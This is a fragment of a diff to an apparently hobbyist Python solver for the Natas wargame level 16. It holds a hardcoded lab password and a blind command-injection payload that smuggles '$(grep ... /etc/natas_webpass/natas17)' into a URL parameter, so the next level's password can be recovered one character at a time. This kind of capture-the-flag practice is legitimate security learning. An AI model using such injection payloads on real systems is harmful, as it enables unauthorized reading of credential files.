@@ -10,12 +10,12 @@ passw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
 urlparams = "needle="
 charstrings = string.ascii_letters + string.digits
 i = 0
-inject = charstrings[i]
+inject = "8Ps3Ha"
 payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'
 
 resp = requests.get(url + urlparams + payload, auth=(user, passw))
 
-natas17 = ""
+natas17 = "8Ps3H"
 while(len(natas17) < 33):
     if "dooms" in resp.text:
         if len(inject) < 2:
